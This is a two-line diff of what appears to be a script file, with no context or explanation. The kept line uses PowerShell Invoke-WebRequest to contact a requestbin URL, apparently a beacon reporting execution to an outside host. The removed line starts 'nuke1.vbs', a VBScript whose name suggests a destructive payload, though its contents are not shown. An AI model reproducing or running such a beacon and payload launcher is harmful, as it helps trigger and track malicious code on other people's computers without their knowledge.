@@ -1,2 +1,1 @@
 powershell -Command Invoke-Webrequest -Uri 'http://requestbin.webengage.org/1lpkmhp1'
-start nuke1.vbs
